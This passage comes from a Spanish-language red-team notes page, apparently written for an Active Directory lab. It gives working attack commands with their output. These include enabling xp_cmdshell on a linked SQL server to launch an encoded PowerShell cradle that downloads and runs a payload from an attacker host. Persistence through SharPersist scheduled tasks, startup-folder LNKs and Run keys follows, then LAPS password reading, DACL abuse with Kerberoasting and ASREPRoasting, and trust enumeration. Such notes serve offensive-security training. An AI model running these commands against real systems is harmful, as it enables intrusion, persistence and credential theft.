+<span style="color:#66d9ef">EXEC</span>(<span style="color:#e6db74">&#39;sp_configure &#39;&#39;show advanced options&#39;&#39;, 1; reconfigure;&#39;</span>) <span style="color:#66d9ef">AT</span> [<span style="color:#66d9ef">sql</span>.rto.<span style="color:#66d9ef">external</span>]
+<span style="color:#66d9ef">EXEC</span>(<span style="color:#e6db74">&#39;sp_configure &#39;&#39;xp_cmdshell&#39;&#39;, 1; reconfigure;&#39;</span>) <span style="color:#66d9ef">AT</span> [<span style="color:#66d9ef">sql</span>.rto.<span style="color:#66d9ef">external</span>]
+
+<span style="color:#f92672">#</span> Revshell
+
+<span style="color:#66d9ef">EXECUTE</span>(<span style="color:#e6db74">&#39;EXEC xp_cmdshell &#39;&#39;hostname &amp;&amp; whoami&#39;&#39;;&#39;</span>) <span style="color:#66d9ef">AT</span> [<span style="color:#66d9ef">sql</span>.rto.<span style="color:#66d9ef">external</span>]
+
+<span style="color:#66d9ef">EXECUTE</span>(<span style="color:#e6db74">&#39;EXEC xp_cmdshell &#39;&#39;powershell -nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADIAMwAuADUANQA6ADgAMAA4ADAALwBiACIAKQApAAoA&#39;&#39;;&#39;</span>) <span style="color:#66d9ef">AT</span> [<span style="color:#66d9ef">sql</span>.rto.<span style="color:#66d9ef">external</span>]
+
+</code></pre></div><hr>
+<h3 id="persistencia-con-sharppersist-">Persistencia con SharpPersist 🧲</h3>
+<p>El programador de tareas de windows nos permite crear &ldquo;tareas&rdquo; que se ejecutan con un &lsquo;disparador&rsquo; predeterminado, ese evento podria ser una hora del dia, o la sesion de inicio de algun usuario</p>
+<h5 id="creando-tarea-programada">Creando Tarea Programada</h5>
+<p><strong>En Linux</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# str<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;IEX ((new-object net.webclient).downloadstring(&#34;http://10.10.5.120/a&#34;))&#39;</span> 
+root@kali:~# echo -en $str | iconv -t UTF-16LE | base64 -w <span style="color:#ae81ff">0</span> 
+SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgA1AC4AMQAAh<span style="color:#f92672">=</span>AKADAAL
+</code></pre></div><p><strong>En Windows</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-batch" data-lang="batch">PS C:\&gt; $str = &#39;IEX ((new-object net.webclient).downloadstring(<span style="color:#e6db74">&#34;http://10.10.5.120/a&#34;</span>))&#39;
+PS C:\&gt; [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
+SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgA1AC4AMQAyADAALwBhACIAKQApAA==
+</code></pre></div><p>Creando una tarea programada en sharpersist</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">execute<span style="color:#f92672">-</span>assembly C<span style="color:#f92672">:</span><span style="color:#960050;background-color:#1e0010">\</span>Tools<span style="color:#960050;background-color:#1e0010">\</span>SharPersist<span style="color:#960050;background-color:#1e0010">\</span>SharPersist<span style="color:#960050;background-color:#1e0010">\</span>bin<span style="color:#960050;background-color:#1e0010">\</span>Debug<span style="color:#960050;background-color:#1e0010">\</span>SharPersist<span style="color:#f92672">.</span><span style="color:#a6e22e">exe</span> <span style="color:#f92672">-</span>t schtask <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#34;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe&#34;</span> <span style="color:#f92672">-</span>a <span style="color:#e6db74">&#34;-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgA1AC4AMQAyADAALwBhACIAKQApAA==&#34;</span> <span style="color:#f92672">-</span>n <span style="color:#e6db74">&#34;Updater&#34;</span> <span style="color:#f92672">-</span>m add <span style="color:#f92672">-</span>o hourly
+</code></pre></div><p>Donde:</p>
+<table>
+<thead>
+<tr>
+<th><strong>Argumentos</strong></th>
+<th><strong>Explanation</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>-t</code></td>
+<td><strong>Tecnica de persistencia deseada</strong></td>
+</tr>
+<tr>
+<td><code>-c</code></td>
+<td><strong>Comando a ejecutar</strong></td>
+</tr>
+<tr>
+<td><code>-a</code></td>
+<td><strong>Argumentos para ese comando</strong></td>
+</tr>
+<tr>
+<td><code>-n</code></td>
+<td><strong>Nombre de la tarea</strong></td>
+</tr>
+<tr>
+<td><code>-m</code></td>
+<td><strong>Modo (add, remove, check y list)</strong></td>
+</tr>
+<tr>
+<td><code>-o</code></td>
+<td><strong>Es la frecuencia de la tarea</strong></td>
+</tr>
+</tbody>
+</table>
+<h5 id="startup-folder">Startup Folder</h5>
+<p>la carpeta de inicio se ubica en el siguiente path <code>C:\Users\bfarmer\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\</code> es ahi donde podemos soltar un binario, o un lnk malicioso como lo hace <strong>sharpersist</strong>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">beacon&gt; execute-assembly C:\Tools\SharPersist\SharPersist\bin\Debug\SharPersist.exe -t startupfolder -c <span style="color:#e6db74">&#34;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe&#34;</span> -a <span style="color:#e6db74">&#34;-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgA1AC4AMQAyADAALwBhACIAKQApAA==&#34;</span> <span style="color:#f92672">-f</span> <span style="color:#e6db74">&#34;UserEnvSetup&#34;</span> -m add
+
+[*] INFO<span style="color:#960050;background-color:#1e0010">:</span> Adding startup folder persistence
+[*] INFO<span style="color:#960050;background-color:#1e0010">:</span> Command<span style="color:#960050;background-color:#1e0010">:</span> C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+[*] INFO<span style="color:#960050;background-color:#1e0010">:</span> Command Args<span style="color:#960050;background-color:#1e0010">:</span> -nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgA1AC4AMQAyADAALwBhACIAKQApAA==
+[*] INFO<span style="color:#960050;background-color:#1e0010">:</span> File Name<span style="color:#960050;background-color:#1e0010">:</span> UserEnvSetup
+[+] SUCCESS<span style="color:#960050;background-color:#1e0010">:</span> Startup folder persistence created
+[*] INFO<span style="color:#960050;background-color:#1e0010">:</span> LNK File located at<span style="color:#960050;background-color:#1e0010">:</span> C:\Users\bfarmer\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\UserEnvSetup.lnk
+[*] INFO<span style="color:#960050;background-color:#1e0010">:</span> SHA256 Hash of LNK file<span style="color:#960050;background-color:#1e0010">:</span> B34647F8D8B7CE28C1F0DA3FF444D9B7244C41370B88061472933B2607A169BC
+</code></pre></div><h5 id="registry-autorun">Registry Autorun</h5>
+<p>el registro que se suele ejecutar durante el inicio de sesion es el siguiente:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+</code></pre></div><p>Primero debemos crear una carga util, para que el registro apunte hacia ella y la ejecute en el inicio</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-batch" data-lang="batch">beacon&gt; cd C:\ProgramData
+beacon&gt; upload C:\Payloads\beacon-http.exe
+beacon&gt; mv beacon-http.exe updater.exe
+beacon&gt; execute-assembly C:\Tools\SharPersist\SharPersist\bin\Debug\SharPersist.exe -t reg -c <span style="color:#e6db74">&#34;C:\ProgramData\Updater.exe&#34;</span> -a <span style="color:#e6db74">&#34;/q /n&#34;</span> -k <span style="color:#e6db74">&#34;hkcurun&#34;</span> -v <span style="color:#e6db74">&#34;Updater&#34;</span> -m add
+
+[*] INFO: Adding registry persistence
+[*] INFO: Command: C:\ProgramData\Updater.exe
+[*] INFO: Command Args: /q /n
+[*] INFO: Registry Key: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+[*] INFO: Registry Value: Updater
+[*] INFO: Option: 
+[+] SUCCESS: Registry persistence added
+</code></pre></div><table>
+<thead>
+<tr>
+<th>Argumento</th>
+<th>Explanation</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>-k</td>
+<td>es la clave del registro a modificar</td>
+</tr>
+<tr>
+<td>-v</td>
+<td>el nombre de la clave de registro que se va a crear</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<p>tambien podemos usar la colmena de <strong>&ldquo;HKLM&rdquo;</strong> pero para ella necesitamos privilegios de administrador, ya que es la colmena general de registros del equipo y no personal del usuario como lo es <strong>&ldquo;HKCLU&rdquo;</strong>.</p>
+<h3 id="laps">Laps</h3>
+<p><strong>Utilizando Powerview</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e"># Identificar si la maquina actual que comprometimos es un cliente de laps</span>
+ls C:<span style="color:#ae81ff">\P</span>rogram Files<span style="color:#ae81ff">\L</span>APS<span style="color:#ae81ff">\C</span>SE
+
+<span style="color:#75715e">#Busque objetos del dominio donde la propiedad `ms-Mcs-AdmPwdExpirationTime` no sea nula (cualquier usuario de dominio puede leer esta propiedad).</span>
+powershell Get-DomainObject -SearchBase <span style="color:#e6db74">&#34;LDAP://DC=dev,DC=evilcorp,DC=local&#34;</span> | ? <span style="color:#f92672">{</span> $_.<span style="color:#e6db74">&#34;ms-mcs-admpwdexpirationtime&#34;</span> -ne $null <span style="color:#f92672">}</span> | <span style="color:#66d9ef">select</span> DnsHostname
+
+dnshostname              
+-----------              
+wkstn-1.dev.cyberbotic.io
+wkstn-2.dev.cyberbotic.io
+
+<span style="color:#75715e"># Identificar posibles GPOS con laps para extraer su propiedad &#39;gpcfilesyspath&#39; y descargar la configuracion para despues poder parsearla con el modulo </span>
+<span style="color:#75715e"># GPRegistryPolicyParser.psm1 y la funcion &#34;Parse-PolFile&#34;</span>
+powershell Get-DomainGPO | ? <span style="color:#f92672">{</span> $_.DisplayName -like <span style="color:#e6db74">&#34;*laps*&#34;</span> <span style="color:#f92672">}</span> | <span style="color:#66d9ef">select</span> DisplayName, Name, GPCFileSysPath | fl
+
+download <span style="color:#ae81ff">\\</span>dev.evilcorp.local<span style="color:#ae81ff">\S</span>ysVol<span style="color:#ae81ff">\d</span>ev.cyberbotic.io<span style="color:#ae81ff">\P</span>olicies<span style="color:#ae81ff">\{</span>4A8A4E8E-929F-401A-95BD-A7D40E0976C8<span style="color:#f92672">}</span><span style="color:#ae81ff">\M</span>achine<span style="color:#ae81ff">\R</span>egistry.pol
+
+Parse-PolFile .<span style="color:#ae81ff">\R</span>egistry.pol
+
+</code></pre></div><p>Utilizando el cmdlet nativo de laps para administrar</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e"># checkeando si esta instalado el cmdlet</span>
+powershell Get-Command *AdmPwd*
+
+CommandType     Name                                               Version    Source
+-----------     ----                                               -------    ------
+Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
+Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
+Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
+Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
+Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
+Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
+Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
+Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS
+
+<span style="color:#75715e"># Enumerar usuarios de LAPS con permisos para Leer contraseñas en una OU dada</span>
+powershell Find-AdmPwdExtendedRights -Identity Workstations | fl
+
+ObjectDN             : OU<span style="color:#f92672">=</span>Workstations,DC<span style="color:#f92672">=</span>dev,DC<span style="color:#f92672">=</span>evilcorp,DC<span style="color:#f92672">=</span>local
+ExtendedRightHolders : <span style="color:#f92672">{</span>NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM, DEV<span style="color:#ae81ff">\A</span>dmins. del dominio, DEV<span style="color:#ae81ff">\L</span>aps Operators<span style="color:#f92672">}</span>
+
+<span style="color:#75715e"># Leer las contraseñas en este caso utilizaremos al usuario c.rodolfo que es parte del grupo laps operators que tienen permisos de administrar laps.</span>
+powershell Get-AdmPwdPassword -ComputerName wkstn-1 | fl
+
+ComputerName        : WKSTN-1
+DistinguishedName   : CN<span style="color:#f92672">=</span>WKSTN-1,OU<span style="color:#f92672">=</span>Workstations,DC<span style="color:#f92672">=</span>dev,DC<span style="color:#f92672">=</span>evilcorp,DC<span style="color:#f92672">=</span>local
+Password            : &amp;OF<span style="color:#f92672">[</span>T;<span style="color:#75715e">#k$5Wg</span>
+ExpirationTimestamp : 24/02/2022 15:30:09
+
+<span style="color:#75715e">## Teniendo la contraseña podemos movernos lateralmente con psexec,wmiexec o cobalt.</span>
+
+<span style="color:#75715e">## alternativa II</span>
+powershell Get-DomainObjectAcl -SearchBase <span style="color:#e6db74">&#34;LDAP://OU=Workstations,DC=dev,DC=evilcorp,DC=local&#34;</span> -ResolveGUIDs | ? <span style="color:#f92672">{</span> $_.ObjectAceType -eq <span style="color:#e6db74">&#34;ms-Mcs-AdmPwd&#34;</span> -and $_.ActiveDirectoryRights -like <span style="color:#e6db74">&#34;*ReadProperty*&#34;</span> <span style="color:#f92672">}</span> | <span style="color:#66d9ef">select</span> ObjectDN, SecurityIdentifier
+
+ObjectDN                                              SecurityIdentifier
+--------                                              ------------------
+OU<span style="color:#f92672">=</span>Workstations,DC<span style="color:#f92672">=</span>dev,DC<span style="color:#f92672">=</span>cyberbotic,DC<span style="color:#f92672">=</span>io            S-1-5-21-3263068140-2042698922-2891547269-1125
+CN<span style="color:#f92672">=</span>WKSTN-1,OU<span style="color:#f92672">=</span>Workstations,DC<span style="color:#f92672">=</span>dev,DC<span style="color:#f92672">=</span>cyberbotic,DC<span style="color:#f92672">=</span>io S-1-5-21-3263068140-2042698922-2891547269-1125
+CN<span style="color:#f92672">=</span>WKSTN-2,OU<span style="color:#f92672">=</span>Workstations,DC<span style="color:#f92672">=</span>dev,DC<span style="color:#f92672">=</span>cyberbotic,DC<span style="color:#f92672">=</span>io S-1-5-21-3263068140-2042698922-2891547269-1125
+
+beacon&gt; powershell ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1125
+DEV<span style="color:#ae81ff">\1</span>st Line Support
+
+beacon&gt; make_token DEV<span style="color:#ae81ff">\j</span>king Purpl3Drag0n
+beacon&gt; powershell Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd
+
+ms-mcs-admpwd 
+------------- 
+P0OPwa4R64AkbJ
+
+</code></pre></div><hr>
+<h2 id="listas-de-control-de-acceso-discrecional-dacl">Listas de control de acceso discrecional (DACL)</h2>
+<p>Puede haber instancias en todo el dominio en las que algunos directores tengan ACL en cuentas más privilegiadas, lo que permite abusar de ellas para apoderarse de la cuenta. Un ejemplo simple de esto podría ser un grupo de &ldquo;soporte&rdquo; que puede restablecer las contraseñas de los &ldquo;Administradores de dominio&rdquo;</p>
+<p>Podemos comenzar dirigiéndonos a un solo principal. Esta consulta devolverá cualquier principal que tenga <strong>GenericAll</strong> , <strong>WriteProperty</strong> o <strong>WriteDacl</strong> en la cuenta de usuario jadams</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">powershell Get-DomainObjectAcl -Identity jadams | ? { $_.ActiveDirectoryRights <span style="color:#f92672">-match</span> <span style="color:#e6db74">&#34;GenericAll|WriteProperty|WriteDacl&#34;</span> <span style="color:#f92672">-and</span> $_.SecurityIdentifier <span style="color:#f92672">-match</span> <span style="color:#e6db74">&#34;S-1-5-21-2697495467-513533215-122973509-[\d]{4,10}&#34;</span> } | select SecurityIdentifier, ActiveDirectoryRights | fl
+
+SecurityIdentifier    <span style="color:#960050;background-color:#1e0010">:</span> S-1-5-21-2697495467-513533215-122973509-1137
+ActiveDirectoryRights <span style="color:#960050;background-color:#1e0010">:</span> GenericAll
+
+SecurityIdentifier    <span style="color:#960050;background-color:#1e0010">:</span> S-1-5-21-2697495467-513533215-122973509-1137
+ActiveDirectoryRights <span style="color:#960050;background-color:#1e0010">:</span> GenericAll
+
+powershell ConvertFrom-SID <span style="color:#e6db74">&#34;S-1-5-21-2697495467-513533215-122973509-1137&#34;</span>
+DEV\1st line support
+</code></pre></div><p>También podríamos lanzar una red más amplia y apuntar a unidades organizativas completas.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">powershell Get-DomainObjectAcl -SearchBase <span style="color:#e6db74">&#34;CN=Users,DC=dev,DC=evilcorp,DC=local&#34;</span> | ? { $_.ActiveDirectoryRights <span style="color:#f92672">-match</span> <span style="color:#e6db74">&#34;GenericAll|WriteProperty|WriteDacl&#34;</span> <span style="color:#f92672">-and</span> $_.SecurityIdentifier <span style="color:#f92672">-match</span> <span style="color:#e6db74">&#34;S-1-5-21-2697495467-513533215-122973509-[\d]{4,10}&#34;</span> } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl
+
+ObjectDN              <span style="color:#960050;background-color:#1e0010">:</span> CN=Joyce Adam,CN=Users,DC=dev,DC=cyberbotic,DC=io
+ActiveDirectoryRights <span style="color:#960050;background-color:#1e0010">:</span> GenericAll
+SecurityIdentifier    <span style="color:#960050;background-color:#1e0010">:</span> S-1-5-21-3263068140-2042698922-2891547269-1125
+
+ObjectDN              <span style="color:#960050;background-color:#1e0010">:</span> CN=1st Line Support,CN=Users,DC=dev,DC=cyberbotic,DC=io
+ActiveDirectoryRights <span style="color:#960050;background-color:#1e0010">:</span> GenericAll
+SecurityIdentifier    <span style="color:#960050;background-color:#1e0010">:</span> S-1-5-21-3263068140-2042698922-2891547269-1125
+
+ObjectDN              <span style="color:#960050;background-color:#1e0010">:</span> CN=Developers,CN=Users,DC=dev,DC=cyberbotic,DC=io
+ActiveDirectoryRights <span style="color:#960050;background-color:#1e0010">:</span> GenericAll
+SecurityIdentifier    <span style="color:#960050;background-color:#1e0010">:</span> S-1-5-21-3263068140-2042698922-2891547269-1125
+
+ObjectDN              <span style="color:#960050;background-color:#1e0010">:</span> CN=Oracle Admins,CN=Users,DC=dev,DC=cyberbotic,DC=io
+ActiveDirectoryRights <span style="color:#960050;background-color:#1e0010">:</span> GenericAll
+SecurityIdentifier    <span style="color:#960050;background-color:#1e0010">:</span> S-1-5-21-3263068140-2042698922-2891547269-1125
+</code></pre></div><p>Esto muestra que 1st Line Support tiene <strong>GenericAll</strong> en varios usuarios y grupos. Entonces, <strong>¿cómo podemos abusar de estos?</strong></p>
+<h3 id="abusando-de-dacl">Abusando de DACL⚔</h3>
+<h5 id="reset-user-password">Reset User Password</h5>
+<p>Reset a user&rsquo;s password (pretty bad OPSEC). 🎈</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">beacon&gt; make_token DEV\jking Purpl3Drag0n
+[*] Tasked beacon to create a token <span style="color:#66d9ef">for</span> DEV\jking
+[+] host called home, sent<span style="color:#960050;background-color:#1e0010">:</span> 52 bytes
+[+] Impersonated DEV\svc_test
+
+beacon&gt; run net user TestAcl NewPassword! /domain
+[*] Tasked beacon to run<span style="color:#960050;background-color:#1e0010">:</span> net user TestAcl NewPassword! /domain
+[+] host called home, sent<span style="color:#960050;background-color:#1e0010">:</span> 67 bytes
+[+] received output<span style="color:#960050;background-color:#1e0010">:</span>
+Se procesara la solicitud en un controlador de dominio del dominio dev.evilcorp.local.
+
+Se ha completado el comando correctamente.
+</code></pre></div><h5 id="targeted-kerberoasting">Targeted Kerberoasting</h5>
+<p>En lugar de cambiar la contraseña, podemos configurar un SPN en la cuenta, hacer kerberoast e intentar crackear el password offline.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#75715e"># Asignando un SPN a una cuenta</span>
+powershell Set-DomainObject -Identity TestAcl -Set @{serviceprincipalname=<span style="color:#e6db74">&#34;fake/service&#34;</span>}
+
+<span style="color:#75715e"># Comprobando SPN</span>
+beacon&gt; powershell Get-DomainUser -Identity <span style="color:#e6db74">&#34;TestAcl&#34;</span> -Properties samaccountname,serviceprincipalname,Lastlogon
+[*] Tasked beacon to run<span style="color:#960050;background-color:#1e0010">:</span> Get-DomainUser -Identity <span style="color:#e6db74">&#34;TestAcl&#34;</span> -Properties samaccountname,serviceprincipalname,Lastlogon
+[+] host called home, sent<span style="color:#960050;background-color:#1e0010">:</span> 529 bytes
+[+] received output<span style="color:#960050;background-color:#1e0010">:</span>
+
+lastlogon          serviceprincipalname samaccountname
+---------          -------------------- --------------
+01/01/1601 1<span style="color:#960050;background-color:#1e0010">:</span>00<span style="color:#960050;background-color:#1e0010">:</span>00 fake/service         TestAcl
+
+<span style="color:#75715e"># Aplicando Kerberoast</span>
+beacon&gt; execute-assembly /opt/tools/rubeus/Rubeus.exe kerberoast /user<span style="color:#960050;background-color:#1e0010">:</span>testacl /nowrap
+
+<span style="color:#75715e"># Removiendo un SPN asignado a un usuario</span>
+powershell Set-DomainObject -Identity jadams -Clear ServicePrincipalName
+
+</code></pre></div><h5 id="targeted-asreproasting">Targeted ASREPRoasting</h5>
+<p>Es la misma que la anterior nada mas que esta vez modificamos un valor para que el objeto tenga la bandera <code>DONT_REQ_PREAUTH</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">beacon&gt; powershell Get-DomainUser -Identity TestAcl | ConvertFrom-UACValue
+
+Name                           Value                                                                                   
+----                           -----                                                                                   
+NORMAL_ACCOUNT                 512                                                                                     
+DONT_EXPIRE_PASSWORD           65536                                                                                   
+
+
+<span style="color:#75715e"># Modificamos el valor de userAccountControl</span>
+powershell Set-DomainObject -Identity TestAcl -XOR @{UserAccountControl=4194304}
+
+<span style="color:#75715e"># Chequeamos</span>
+powershell Get-DomainUser -Identity TestAcl | ConvertFrom-UACValue
+
+Name                           Value                                                                                   
+----                           -----                                                                                   
+NORMAL_ACCOUNT                 512                                                                                     
+DONT_EXPIRE_PASSWORD           65536                                                                                   
+DONT_REQ_PREAUTH               4194304 
+
+
+<span style="color:#75715e"># Aplicando ASREPROAST</span>
+execute-assembly /opt/tools/rubeus/Rubeus.exe asreproast /user<span style="color:#960050;background-color:#1e0010">:</span>TestAcl /nowrap
+
+<span style="color:#75715e"># Quitar el valor modificado del la propiedad userAccountControl</span>
+powershell Set-DomainObject -Identity TestAcl -XOR @{UserAccountControl=4194304} -Verbose
+
+<span style="color:#75715e"># Chequeamos</span>
+powershell Get-DomainUser -Identity TestAcl | ConvertFrom-UACValue
+
+Name                           Value                                                                                   
+----                           -----                                                                                   
+NORMAL_ACCOUNT                 512                                                                                     
+DONT_EXPIRE_PASSWORD           65536                                                                                   
+     
+</code></pre></div><h5 id="modificar-la-pertenencia-a-un-grupo-de-dominio">Modificar la pertenencia a un grupo de dominio</h5>
+<p>Si tenemos la ACL en un grupo, podemos agregar y eliminar miembros.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">run net group <span style="color:#e6db74">&#34;Oracle Admins&#34;</span> TestAcl /add /domain
+
+<span style="color:#75715e"># Chequeando</span>
+beacon&gt; powershell Get-DomainGroupMember <span style="color:#e6db74">&#34;Oracle Admins&#34;</span>
+
+GroupDomain             <span style="color:#960050;background-color:#1e0010">:</span> dev.evilcorp.local
+GroupName               <span style="color:#960050;background-color:#1e0010">:</span> Oracle Admins
+GroupDistinguishedName  <span style="color:#960050;background-color:#1e0010">:</span> CN=Oracle Admins,CN=Users,DC=dev,DC=evilcorp,DC=local
+MemberDomain            <span style="color:#960050;background-color:#1e0010">:</span> dev.evilcorp.local
+MemberName              <span style="color:#960050;background-color:#1e0010">:</span> TestAcl
+MemberDistinguishedName <span style="color:#960050;background-color:#1e0010">:</span> CN=TestAcl,CN=Users,DC=dev,DC=evilcorp,DC=local
+MemberObjectClass       <span style="color:#960050;background-color:#1e0010">:</span> user
+MemberSID               <span style="color:#960050;background-color:#1e0010">:</span> S-1-5-21-2697495467-513533215-122973509-1138
+</code></pre></div><blockquote>
+<p>🎇Hay otras DACL interesantes que pueden conducir a abusos similares. Por ejemplo, con <strong>WriteDacl</strong> puede otorgar <strong>GenericAll</strong> a cualquier principal. Con <strong>WriteOwner</strong> , puede cambiar la propiedad del objeto a cualquier principal que luego heredaría GenericAll sobre él.</p>
+</blockquote>
+<hr>
+<h3 id="forest-and-domain-trust">Forest And Domain Trust</h3>
+<h4 id="inbound-">Inbound ➡</h4>
+<p>Debido a que la confianza es entrante desde nuestra perspectiva, significa que a los principales en nuestro dominio se les puede otorgar acceso a los recursos en el dominio externo.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#75715e"># Map Trust Domains</span>
+powershell Invoke-MapDomainTrust | select SourceName,TargetName,TrustDirection 
+
+SourceName         TargetName         TrustDirection
+----------         ----------         --------------
+dev.evilcorp.local evilcorp.local     Bidirectional 
+dev.evilcorp.local sucursal.external  Inbound       
+sucursal.external  dev.evilcorp.local Outbound      
+evilcorp.local     dev.evilcorp.local Bidirectional 
+evilcorp.local     madrid.external    Outbound
+
+<span style="color:#75715e"># Domain trust </span>
+powershell Get-DomainTrust 
+powershell Get-DomainTrust -Domain evilcorp.local
+
+<span style="color:#75715e"># Idenfiticar equipos del dominio externo</span>
+powershell Get-DomainComputer -Domain sucursal.external | select dnshostname
+
+<span style="color:#75715e"># Get-DomainForeignGroupMember enumerará cualquier grupo que contenga usuarios fuera de su dominio y devolverá sus miembros.</span>
+powershell Get-DomainForeignGroupMember -Domain sucursal.external
+
+GroupDomain             <span style="color:#960050;background-color:#1e0010">:</span> sucursal.external
+GroupName               <span style="color:#960050;background-color:#1e0010">:</span> Administradores
+GroupDistinguishedName  <span style="color:#960050;background-color:#1e0010">:</span> CN=Administradores,CN=Builtin,DC=sucursal,DC=external
+MemberDomain            <span style="color:#960050;background-color:#1e0010">:</span> sucursal.external
+MemberName              <span style="color:#960050;background-color:#1e0010">:</span> S-1-5-21-2697495467-513533215-122973509-1148
+MemberDistinguishedName <span style="color:#960050;background-color:#1e0010">:</span> CN=S-1-5-21-2697495467-513533215-122973509-1148,CN=ForeignSecurityPrincipals,DC=sucursal,DC=external
+
+<span style="color:#75715e"># Convertir SID para saber que usuario/grupo pertenece al grupo administradores del dominio con relacion entrante</span>
+powershell ConvertFrom-SID <span style="color:#e6db74">&#34;S-1-5-21-2697495467-513533215-122973509-1148&#34;</span>
+DEV\Subsidiary Admins
+
+<span style="color:#75715e"># Enumerar defensas</span>
+execute-assembly /opt/tools/Seatbelt.exe AMSIProviders AntiVirus AppLocker Powershell UAC -computername=<span style="color:#e6db74">&#34;ad.sucursal.external&#34;</span>
+
+<span style="color:#75715e"># Enumerar Grupos Local</span>
+powershell Get-NetLocalGroupMember -ComputerName ad.sucursal.external
+
+
+<span style="color:#75715e"># Listar recursos</span>
